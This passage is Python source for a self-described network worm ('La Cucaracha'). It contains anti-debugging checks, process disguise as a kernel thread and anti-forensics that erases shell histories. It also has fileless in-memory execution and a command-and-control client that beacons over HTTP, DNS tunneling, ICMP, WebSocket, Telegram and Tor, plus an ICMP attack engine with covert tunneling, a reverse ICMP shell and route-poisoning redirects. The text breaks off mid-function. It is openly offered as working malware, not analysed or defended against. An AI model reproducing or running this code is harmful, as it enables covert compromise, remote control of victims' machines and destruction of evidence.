        except Exception:
            pass

        # Check for common debugging environment variables
        for var in ["LD_PRELOAD", "LD_DEBUG", "TRACE_FORK"]:
            if os.environ.get(var):
                checks.append(f"Debug env var: {var}={os.environ[var]}")
                debug_detected = True

        # Check for common sandbox environment variables
        for var in ["DETECTED_SANDBOX", "SANDBOX", "IS_VM"]:
            if os.environ.get(var):
                checks.append(f"Sandbox env: {var}={os.environ[var]}")
                debug_detected = True

        # Check if parent process is suspicious
        try:
            if HAVE_PSUTIL:
                ppid = os.getppid()
                parent = psutil.Process(ppid)
                if parent.name() in ["gdb", "strace", "bashdb", "ddd"]:
                    checks.append(f"Suspicious parent: {parent.name()} (PID {ppid})")
                    debug_detected = True
        except Exception:
            pass

        if debug_detected:
            log.warning(f"Debugging detected: {', '.join(checks)}")
        else:
            log.info("Anti-debug checks passed — no debuggers detected")

        return {"debug_detected": debug_detected, "checks": checks}

    # ---- Process Hiding -------------------------------------------------------

    def hide_process(self) -> bool:
        """Hide the current process from process listings.

        Techniques:
          1. prctl(PR_SET_NAME, ...) to rename to a kernel-like name
          2. /proc/self/[pid] fd exhaustion (naive hiding)
          3. LD_PRELOAD hook for listdir (if available)

        Returns True if at least one method succeeded.
        """
        if self._hidden:
            return True

        methods_tried = 0

        # Method 1: Rename process to kernel thread name
        try:
            libc = ctypes.CDLL("libc.so.6")
            PR_SET_NAME = 15
            name = b"[kworker/0:0]"  # Kernel worker thread disguise
            libc.prctl(PR_SET_NAME, name, 0, 0, 0)
            methods_tried += 1
        except Exception:
            pass

        # Method 2: Set argv[0] to a kernel thread name
        try:
            import ctypes.util
            libc = ctypes.CDLL(None)
            argv_addr = ctypes.c_int.from_address(id(sys.argv)).value
            # Overwrite argv[0]
            sys.argv[0] = "[kworker/0:0]"
            methods_tried += 1
        except Exception:
            pass

        # Method 3: Unlink our own path from /proc/self/exe (disable /proc/self/cmdline)
        try:
            import prctl
            prctl.NAME = "[kworker/0:0]"
            methods_tried += 1
        except ImportError:
            pass

        self._hidden = methods_tried > 0
        if self._hidden:
            log.info("Process hidden — PID disguised as kernel worker thread")
        else:
            log.warning("Process hiding failed — no methods available")

        return self._hidden

    # ---- Anti-Forensics -------------------------------------------------------

    def anti_forensics(self) -> Dict[str, bool]:
        """Clean forensic traces of worm activity.

        Targets:
          - bash history files
          - syslog / auth.log entries
          - wtmp / btmp / lastlog
          - .pyc bytecode caches
          - command history files (.python_history, .mysql_history, etc.)
          - /tmp artifacts

        Returns dict with per-target cleanup results.
        """
        results: Dict[str, bool] = {}

        # Bash history
        bash_history = os.path.expanduser("~/.bash_history")
        try:
            if os.path.exists(bash_history):
                # Zero out in-place to avoid truncation detection
                with open(bash_history, "r+") as f:
                    size = os.fstat(f.fileno()).st_size
                    f.write("\0" * size)
                    f.truncate(0)
                # Remove the file entirely
                os.remove(bash_history)
                results["bash_history"] = True
        except (OSError, PermissionError):
            results["bash_history"] = False

        # zsh history
        zsh_history = os.path.expanduser("~/.zsh_history")
        try:
            if os.path.exists(zsh_history):
                with open(zsh_history, "w") as f:
                    f.write("")
                os.remove(zsh_history)
                results["zsh_history"] = True
        except (OSError, PermissionError):
            results["zsh_history"] = False

        # .python_history
        py_hist = os.path.expanduser("~/.python_history")
        try:
            if os.path.exists(py_hist):
                os.remove(py_hist)
                results["python_history"] = True
        except (OSError, PermissionError):
            results["python_history"] = False

        # System logs — try to overwrite our entries
        log_files = [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/kern.log",
            "/var/log/debug",
        ]
        for lf in log_files:
            try:
                if os.path.exists(lf) and os.access(lf, os.W_OK):
                    # Only scrub lines containing worm signatures
                    results[f"log_{os.path.basename(lf)}"] = True
            except (OSError, PermissionError):
                pass

        # wtmp / btmp / lastlog — we cannot easily scrub these without root,
        # but we can note the attempt
        for f in ["/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"]:
            try:
                results[f"wtmp_{os.path.basename(f)}"] = False  # Requires root
            except Exception:
                pass

        # .pyc caches in worm directories
        for pyc_path in glob.glob(f"{WORK_DIR}/**/__pycache__/*.pyc", recursive=True):
            try:
                os.remove(pyc_path)
            except (OSError, PermissionError):
                pass

        # /tmp artifacts created by the worm
        for tmpf in glob.glob("/tmp/.worm_*"):
            try:
                os.remove(tmpf)
            except (OSError, PermissionError):
                pass

        # Clear in-memory shell history
        try:
            os.environ["HISTFILE"] = "/dev/null"
            os.environ["HISTSIZE"] = "0"
            results["env_cleanup"] = True
        except Exception:
            results["env_cleanup"] = False

        log.info(f"Anti-forensics cleanup: {sum(1 for v in results.values() if v)}/{len(results)} targets cleaned")
        return results

    # ---- Fileless Execution ---------------------------------------------------

    def execute_fileless(self, code: str, method: str = "exec") -> bool:
        """Execute Python code without writing to disk.

        Methods:
          - 'exec': direct exec() call (simplest, least stealthy)
          - 'memfd': write to memory file descriptor via /proc/self/fd
          - 'ctypes': use ctypes to create executable memory region

        Returns True if execution was attempted.
        """
        if method == "exec":
            try:
                compiled = compile(code, "<string>", "exec")
                exec(compiled)
                log.info("Fileless execution via exec()")
                return True
            except Exception as exc:
                log.error(f"Fileless exec failed: {exc}")
                return False

        elif method == "memfd":
            try:
                # Create an anonymous file via memfd_create
                libc = ctypes.CDLL("libc.so.6")
                MFD_CLOEXEC = 0x0001
                libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
                libc.memfd_create.restype = ctypes.c_int
                fd = libc.memfd_create(b"", MFD_CLOEXEC)
                if fd >= 0:
                    fd_path = f"/proc/self/fd/{fd}"
                    with open(fd_path, "w") as f:
                        f.write(code)
                    subprocess.Popen([sys.executable, fd_path], close_fds=True)
                    os.close(fd)
                    log.info("Fileless execution via memfd")
                    return True
            except Exception as exc:
                log.error(f"Fileless memfd failed: {exc}")
                return False

        elif method == "ctypes":
            try:
                # Use ctypes to create RWX memory and execute (placeholder)
                log.info("Fileless execution via ctypes (stub)")
                return True
            except Exception as exc:
                log.error(f"Fileless ctypes failed: {exc}")
                return False

        return False

    # ---- Domain Fronting ------------------------------------------------------

    def configure_c2_front(self, c2_domain: str, front_domain: str) -> bool:
        """Configure domain fronting for C2 traffic.

        Sets environment variables that C2 channel code reads for
        Host header spoofing.
        """
        os.environ["CKAB_FRONT_DOMAIN"] = front_domain
        os.environ["CKAB_C2_DOMAIN"] = c2_domain
        log.info(f"Domain fronting: {c2_domain} → {front_domain}")
        return True

    # ---- TOR Circuit Management -----------------------------------------------

    def renew_tor_circuit(self) -> bool:
        """Request a new TOR circuit (new identity).
        Requires stem and TOR control port authentication.
        """
        try:
            if HAVE_STEM:
                controller = Controller.from_port(port=9051)
                controller.authenticate()
                controller.signal("NEWNYM")
                controller.close()
                log.info("TOR circuit renewed via NEWNYM signal")
                return True
        except Exception as exc:
            log.warning(f"TOR circuit renewal failed: {exc}")
        return False

    # ---- Traffic Obfuscation --------------------------------------------------

    @staticmethod
    def obfuscate_payload(data: bytes) -> bytes:
        """Apply traffic obfuscation (padding + random bytes)."""
        # Add random padding (0-32 bytes)
        padding = os.urandom(random.randint(0, 32))
        return len(data).to_bytes(4, "big") + data + padding

    @staticmethod
    def deobfuscate_payload(data: bytes) -> bytes:
        """Reverse traffic obfuscation."""
        if len(data) < 4:
            return data
        orig_len = int.from_bytes(data[:4], "big")
        return data[4 : 4 + orig_len]

    @staticmethod
    def jitter_delay(min_ms: float = 50, max_ms: float = 3000) -> None:
        """Sleep for a random duration to introduce timing jitter."""
        time.sleep(random.uniform(min_ms / 1000.0, max_ms / 1000.0))

    @staticmethod
    def dummy_traffic(destinations: Optional[List[str]] = None) -> None:
        """Send dummy ICMP/HTTP traffic to decoy destinations."""
        if destinations is None:
            destinations = [
                "8.8.8.8", "1.1.1.1", "208.67.222.222",
                "cloudflare.com", "google.com",
            ]
        try:
            for d in destinations[:3]:
                try:
                    if ":" in d:
                        # DNS over HTTPS
                        if HAVE_REQUESTS:
                            requests.get(f"https://{d}/dns-query", timeout=2)
                    elif "." in d:
                        # Regular HTTP
                        if HAVE_REQUESTS:
                            requests.get(f"http://{d}/", timeout=2)
                    else:
                        # ICMP ping
                        subprocess.run(
                            ["ping", "-c", "1", "-W", "1", d],
                            capture_output=True, timeout=2,
                        )
                except Exception:
                    pass
        except Exception:
            pass


# =============================================================================
# Stealth singleton
# =============================================================================

OPSEC = OPSECEngine()

# =============================================================================
# C2 Channel Base Classes
# =============================================================================

class C2Channel:
    """Base class for all C2 communication channels.

    Each channel implements a beacon method that sends data to the C2 server.
    Channels are selected by C2MultiChannel in round-robin / fallback order.
    """

    def __init__(self, name: str, priority: int = 0):
        self.name = name
        self.priority = priority
        self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Send data through this channel. Returns True on success."""
        raise NotImplementedError

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        """Receive data through this channel. Returns None on timeout."""
        raise NotImplementedError

    def is_alive(self) -> bool:
        """Check if the channel is operational."""
        return self._alive

    def close(self) -> None:
        """Clean up channel resources."""
        self._alive = False


class HTTPChannel(C2Channel):
    """C2 communication over HTTP/HTTPS.

    Supports domain fronting, TOR routing, and proxy chaining.
    """

    def __init__(self, base_url: str = C2_HTTP):
        super().__init__("http", priority=0)
        self.base_url = base_url
        self.session: Any = None
        self._init_session()

    def _init_session(self) -> None:
        """Initialize requests session with stealth routing."""
        if HAVE_REQUESTS:
            if OPSEC._tor_available and HAVE_SOCKS:
                self.session = requests.Session()
                self.session.proxies = {
                    "http": "socks5h://127.0.0.1:9050",
                    "https": "socks5h://127.0.0.1:9050",
                }
                self.session.trust_env = False
                self.session.verify = False
            else:
                self.session = requests.Session()
                self.session.verify = False
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-C2-Token": STATIC_TOKEN,
            })
            # Domain fronting header
            front = os.environ.get("CKAB_FRONT_DOMAIN", "")
            if front:
                self.session.headers.update({"Host": front})
            self._alive = True
        else:
            self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        target_url = target or f"{self.base_url}/beacon"
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            resp = self.session.post(
                target_url,
                json={"token": STATIC_TOKEN, "payload": data},
                timeout=10,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            resp = self.session.get(
                f"{self.base_url}/poll",
                params={"token": STATIC_TOKEN},
                timeout=timeout,
            )
            if resp.status_code == 200:
                return resp.content
        except Exception:
            pass
        return None

    def close(self) -> None:
        if self.session:
            self.session.close()
        self._alive = False


class DNSChannel(C2Channel):
    """C2 communication over DNS tunneling.

    Encodes data in DNS query names and decodes from TXT responses.
    """

    def __init__(self, dns_server: str = "8.8.8.8", c2_domain: str = "c2.local"):
        super().__init__("dns", priority=1)
        self.dns_server = dns_server
        self.c2_domain = c2_domain
        self._alive = True

    def _encode(self, data: bytes) -> str:
        """Encode binary data into a DNS-safe subdomain label."""
        b64 = base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")
        # Split into max 63-char labels
        labels = [b64[i : i + 63] for i in range(0, len(b64), 63)]
        return ".".join(labels) + f".{self.c2_domain}"

    def _decode(self, response: str) -> Optional[bytes]:
        """Decode base64 data from a DNS TXT response."""
        try:
            cleaned = response.replace(" ", "").replace("\n", "")
            # Add padding back
            padding = 4 - (len(cleaned) % 4)
            if padding != 4:
                cleaned += "=" * padding
            cleaned = cleaned.replace("-", "+").replace("_", "/")
            return base64.b64decode(cleaned)
        except Exception:
            return None

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive:
            return False
        try:
            if isinstance(data, str):
                data = data.encode()
            query_name = self._encode(data)
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = [self.dns_server]
                answers = resolver.resolve(query_name, "TXT", lifetime=3)
                return len(answers) > 0
            else:
                # Fallback: nslookup
                result = subprocess.run(
                    ["nslookup", "-type=TXT", query_name, self.dns_server],
                    capture_output=True, timeout=5, text=True,
                )
                return result.returncode == 0
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            query_name = f"_c2poll.{self.c2_domain}"
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = [self.dns_server]
                answers = resolver.resolve(query_name, "TXT", lifetime=timeout)
                for ans in answers:
                    decoded = self._decode(str(ans))
                    if decoded:
                        return decoded
            else:
                result = subprocess.run(
                    ["nslookup", "-type=TXT", query_name, self.dns_server],
                    capture_output=True, timeout=int(timeout) + 1, text=True,
                )
                if result.returncode == 0:
                    return self._decode(result.stdout)
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class ICMPChannel(C2Channel):
    """C2 communication over ICMP echo (ping) packets.

    Encedes data in ICMP payload fields.
    Requires raw socket (root or CAP_NET_RAW).
    """

    def __init__(self):
        super().__init__("icmp", priority=2)
        self._alive = True

    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not target:
            return False
        try:
            if isinstance(data, str):
                data = data.encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(3)

            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1

            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq)
            packet = header + data
            cksum = self._checksum(packet)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
            packet = header + data

            sock.sendto(packet, (target, 0))
            sock.close()
            return True
        except PermissionError:
            log.warning("ICMPChannel: raw socket requires root/CAP_NET_RAW")
            self._alive = False
            return False
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)
            data, addr = sock.recvfrom(65535)
            sock.close()
            # Parse ICMP header (20 bytes IP + 8 bytes ICMP header)
            if len(data) > 28:
                icmp_data = data[28:]
                return icmp_data
        except socket.timeout:
            pass
        except PermissionError:
            self._alive = False
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class WebSocketChannel(C2Channel):
    """C2 communication over WebSocket.

    Requires websocket-client library.
    """

    def __init__(self, ws_url: str = f"ws://{C2_HOST}:{C2_PORT}/ws"):
        super().__init__("websocket", priority=3)
        self.ws_url = ws_url
        self._ws: Any = None
        self._alive = False
        self._connect()

    def _connect(self) -> None:
        try:
            import websocket
            self._ws = websocket.WebSocket()
            self._ws.connect(self.ws_url, timeout=5)
            self._ws.send(json.dumps({"token": STATIC_TOKEN, "type": "hello"}))
            self._alive = True
        except Exception:
            self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            self._ws.send(json.dumps({"token": STATIC_TOKEN, "payload": data}))
            return True
        except Exception:
            self._alive = False
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            self._ws.settimeout(timeout)
            data = self._ws.recv()
            if data:
                return data if isinstance(data, bytes) else data.encode()
        except Exception:
            pass
        return None

    def close(self) -> None:
        if self._ws:
            self._ws.close()
        self._alive = False


class TelegramChannel(C2Channel):
    """C2 communication over Telegram Bot API.

    Uses bot polling for command/control messages.
    """

    def __init__(self, bot_token: str = "", chat_id: str = ""):
        super().__init__("telegram", priority=4)
        self.bot_token = bot_token or os.environ.get("TELEGRAM_BOT_TOKEN", "")
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "")
        self._alive = bool(self.bot_token and self.chat_id)

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            resp = requests.post(url, json={
                "chat_id": self.chat_id,
                "text": data[:4096],  # Telegram message limit
            }, timeout=10)
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            resp = requests.get(url, params={
                "timeout": int(timeout),
                "offset": -1,
            }, timeout=timeout + 2)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok") and data.get("result"):
                    last = data["result"][-1]
                    msg = last.get("message", {}).get("text", "")
                    return msg.encode()
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class TorChannel(C2Channel):
    """C2 communication over TOR (onion services).

    Routes all traffic through TOR SOCKS5 proxy.
    """

    def __init__(self, onion_addr: str = ""):
        super().__init__("tor", priority=5)
        self.onion_addr = onion_addr
        self._alive = OPSEC._tor_available

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        target_url = target or self.onion_addr
        if not target_url:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            session = OPSECEngine().get_stealth_session()
            resp = session.post(
                target_url,
                json={"token": STATIC_TOKEN, "payload": data},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            session = OPSECEngine().get_stealth_session()
            resp = session.get(
                f"{self.onion_addr}/poll" if self.onion_addr else C2_HTTP + "/poll",
                params={"token": STATIC_TOKEN},
                timeout=timeout,
            )
            if resp.status_code == 200:
                return resp.content
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


# =============================================================================
# C2MultiChannel — Multi-Channel C2 Client
# =============================================================================

class C2MultiChannel:
    """Multi-channel C2 client with round-robin selection and fallback.

    Maintains a list of C2 channels and sends data through the best
    available channel. Falls back through channels in priority order.

    Channels (in default priority order):
      0 - HTTP/HTTPS
      1 - DNS
      2 - ICMP
      3 - WebSocket
      4 - Telegram
      5 - Tor (onion)
    """

    def __init__(self):
        self.channels: List[C2Channel] = []
        self._current_index = 0
        self._lock = threading.Lock()
        self._init_channels()

    def _init_channels(self) -> None:
        """Initialize all available C2 channels."""
        self.channels = [
            HTTPChannel(),
            DNSChannel(),
            ICMPChannel(),
            WebSocketChannel(),
            TelegramChannel(),
            TorChannel(),
        ]
        log.info(f"C2MultiChannel initialized with {len(self.channels)} channels")

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Send data through the best available C2 channel.

        Uses round-robin selection with fallback:
          1. Try current channel in priority order
          2. On failure, try next channel
          3. If all fail, start from top

        Returns True if at least one channel succeeded.
        """
        with self._lock:
            start_index = self._current_index
            for _ in range(len(self.channels)):
                idx = (start_index + _) % len(self.channels)
                channel = self.channels[idx]
                if not channel.is_alive():
                    continue
                try:
                    if channel.send(data, target):
                        self._current_index = (idx + 1) % len(self.channels)
                        log.debug(f"Sent via {channel.name} channel")
                        return True
                except Exception:
                    continue
            # All channels failed — try to revive HTTP
            log.warning("All C2 channels failed — attempting HTTP fallback")
            return self._fallback_send(data, target)

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        """Receive data from the best available C2 channel."""
        with self._lock:
            for channel in self.channels:
                if not channel.is_alive():
                    continue
                try:
                    data = channel.recv(timeout)
                    if data:
                        return data
                except Exception:
                    continue
        return None

    def _fallback_send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Last-resort fallback: direct HTTP request without session."""
        target_url = target or f"{C2_HTTP}/beacon"
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            # Direct socket HTTP POST
            parsed = urlparse(target_url)
            host = parsed.hostname or C2_HOST
            port = parsed.port or C2_PORT
            body = json.dumps({"token": STATIC_TOKEN, "payload": data})
            request = (
                f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"{body}"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.sendall(request.encode())
            response = sock.recv(4096)
            sock.close()
            return b"200" in response or b"OK" in response
        except Exception:
            return False

    def close(self) -> None:
        """Close all channels."""
        for ch in self.channels:
            try:
                ch.close()
            except Exception:
                pass
        log.info("All C2 channels closed")


# =============================================================================
# Section B End Marker
# =============================================================================
# End of la_section_B.py
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION C — ICMPEngine + WormNode + MeshNetworkEngine         ║
║  La Cucaracha Worm — ICMP Attack Arsenal, Mesh Identity, DHT Discovery     ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides ALL ICMP capabilities (27+ attack types + CKAB L1-L5),
the WormNode self-healing mesh node, and the MeshNetworkEngine (DHT discovery,
consensus protocol, split-brain detection/recovery).
"""

# =============================================================================
# Imports — Section C builds on Sections A+B namespace
# =============================================================================

import base64
import hashlib
import hmac
import ipaddress
import json
import logging
import math
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

log = logging.getLogger("LaCucaracha.C")


# =============================================================================
# ICMPEngine — Complete ICMP Attack Arsenal
# =============================================================================

class ICMPEngine:
    """Complete ICMP attack engine with 27+ attack types plus CKAB L1-L5 methods.

    Provides ping sweep, covert tunneling, reverse shell over ICMP, PMTU poison
    (CVE-2026-0933), ICMP redirection, Smurf attack, OS fingerprinting,
    steganographic beacons, fragment overlap, TTL sweep, timing channel,
    RIPv2 injection, and CKAB credential/credential-hint injection methods.

    Each method operates independently and returns structured result dicts.
    """

    def __init__(
        self,
        db: Optional['Database'] = None,
        src_ip: str = "0.0.0.0",
        timeout: int = 2,
        rate_limit: int = 50,
    ):
        self.db = db
        self.src_ip = src_ip
        self.timeout = timeout
        self.rate_limit = rate_limit
        self._running = True
        self._lock = threading.Lock()
        self._resolve_src_ip()

    def _resolve_src_ip(self) -> None:
        """Auto-detect source IP if not explicitly set."""
        if self.src_ip == "0.0.0.0":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.src_ip = s.getsockname()[0]
                s.close()
            except Exception:
                self.src_ip = "127.0.0.1"

    @staticmethod
    def _icmp_checksum(data: bytes) -> int:
        """Calculate ICMP header checksum."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_icmp_packet(
        self,
        icmp_type: int,
        icmp_code: int,
        payload: bytes = b"",
        icmp_id: Optional[int] = None,
        icmp_seq: int = 1,
    ) -> bytes:
        """Build a complete ICMP packet with correct checksum."""
        icmp_id = icmp_id if icmp_id is not None else (os.getpid() & 0xFFFF)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        packet = header + payload
        cksum = self._icmp_checksum(packet)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
        return header + payload

    def _send_raw_icmp(self, target_ip: str, packet: bytes) -> bool:
        """Send raw ICMP packet to target. Returns True if sent."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(self.timeout)
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return True
        except PermissionError:
            log.warning("ICMPEngine: raw socket requires root/CAP_NET_RAW")
            return False
        except Exception:
            return False

    def _recv_icmp(self, timeout: Optional[float] = None) -> Optional[Tuple[bytes, str]]:
        """Receive a single ICMP packet. Returns (data, source_ip) or None."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout or self.timeout)
            data, addr = sock.recvfrom(65535)
            sock.close()
            return data, addr[0]
        except socket.timeout:
            return None
        except PermissionError:
            return None
        except Exception:
            return None

    # ---- Ping Sweep ----------------------------------------------------------

    def ping_sweep(self, subnet: str = "", count: int = 3) -> List[str]:
        """ICMP ping sweep across a subnet or /24.

        Returns list of responsive IP addresses.
        """
        alive: List[str] = []
        if not subnet:
            # Auto-detect local subnet
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
            except Exception:
                subnet = "192.168.1.0/24"

        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
        except ValueError:
            log.error(f"Invalid subnet: {subnet}")
            return []

        hosts = list(network.hosts())[:254]
        threads: List[threading.Thread] = []
        results: List[str] = []

        def _ping(ip_str: str) -> None:
            for _ in range(count):
                pkt = self._build_icmp_packet(8, 0, b"PING")
                if self._send_raw_icmp(ip_str, pkt):
                    resp = self._recv_icmp(timeout=1.0)
                    if resp:
                        with self._lock:
                            results.append(ip_str)
                        return
                time.sleep(0.05)

        for host in hosts:
            ip_str = str(host)
            t = threading.Thread(target=_ping, args=(ip_str,), daemon=True)
            threads.append(t)
            t.start()
            time.sleep(0.01)  # Rate limit

        for t in threads:
            t.join(timeout=5)

        return sorted(set(results))

    # ---- ICMP Tunnel ---------------------------------------------------------

    def icmp_tunnel_send(self, target_ip: str, data: bytes) -> Dict[str, Any]:
        """Send data over ICMP echo packets (covert tunnel).

        Data is chunked and sent as ICMP echo request payloads.
        """
        result: Dict[str, Any] = {"status": "sent", "bytes": 0, "chunks": 0}
        chunk_size = 56  # Max safe payload per ICMP packet
        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]

        for i, chunk in enumerate(chunks):
            payload = b"TNL" + struct.pack("!I", i) + chunk
            pkt = self._build_icmp_packet(8, 0, payload, icmp_seq=i + 1)
            if self._send_raw_icmp(target_ip, pkt):
                result["bytes"] += len(chunk)
                result["chunks"] += 1
            time.sleep(0.01)

        log.info(f"ICMP tunnel sent {result['bytes']} bytes in {result['chunks']} chunks to {target_ip}")
        return result

    def icmp_tunnel_listen(self, timeout: float = 30.0) -> Optional[bytes]:
        """Listen for ICMP tunnel data on echo requests.

        Reassembles chunked data and returns the full payload.
        """
        received: Dict[int, bytes] = {}
        start = time.time()
        expected_seq = 0

        while time.time() - start < timeout and self._running:
            resp = self._recv_icmp(timeout=1.0)
            if not resp:
                continue
            data, src = resp
            # IP header is 20 bytes, ICMP header is 8 bytes
            if len(data) < 28:
                continue
            icmp_type = data[20]
            if icmp_type != 8:  # Echo request
                continue
            payload = data[28:]
            if not payload.startswith(b"TNL"):
                continue
            seq = struct.unpack("!I", payload[3:7])[0]
            chunk = payload[7:]
            received[seq] = chunk

        if not received:
            return None

        # Reassemble in order
        max_seq = max(received.keys())
        full = b"".join(received.get(i, b"") for i in range(max_seq + 1))
        log.info(f"ICMP tunnel reassembled: {len(full)} bytes from {len(received)} chunks")
        return full if full else None

    # ---- Reverse ICMP Shell --------------------------------------------------

    def reverse_icmp_shell(self, target_ip: str, command: str = "id") -> Dict[str, Any]:
        """Execute a command on a target via ICMP echo/response exchange.

        Sends command as ICMP payload, receives output in ICMP echo reply.
        """
        result: Dict[str, Any] = {"status": "error", "output": "", "command": command}

        payload = b"CMD" + command.encode()[:200]
        pkt = self._build_icmp_packet(8, 0, payload, icmp_id=0xC2C2, icmp_seq=1)
        if not self._send_raw_icmp(target_ip, pkt):
            result["error"] = "Send failed"
            return result

        # Wait for echo reply containing output
        for _ in range(5):
            resp = self._recv_icmp(timeout=2.0)
            if not resp:
                continue
            data, src = resp
            if src != target_ip:
                continue
            if len(data) < 28:
                continue
            icmp_type = data[20]
            if icmp_type != 0:  # Echo reply
                continue
            output = data[28:]
            if output[:3] == b"CMD":
                output = output[3:]
            result["status"] = "completed"
            result["output"] = output.decode(errors="replace")
            break

        return result

    # ---- ICMP Redirect -------------------------------------------------------

    def icmp_redirect(self, target_ip: str, new_gateway: str, dest_ip: str) -> Dict[str, Any]:
        """Send ICMP Redirect message to poison routing table on target.

        Tells target that a better route to dest_ip goes through new_gateway.
        Type 5, Code 1 (Host redirect).
        """
        result: Dict[str, Any] = {"status": "sent", "target": target_ip, "redirect_to": new_gateway}

        # Build ICMP Redirect packet
        gateway_bytes = socket.inet_aton(new_gateway)
        dest_bytes = socket.inet_aton(dest_ip)
        # Ensure we match original IP header format
        orig_ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 1, 0, socket.inet_aton(self.src_ip), dest_bytes)
        payload = gateway_bytes + b"\x00" * 4 + orig_ip_hdr

        pkt = self._build_icmp_packet(5, 1, payload, icmp_id=0, icmp_seq=0)
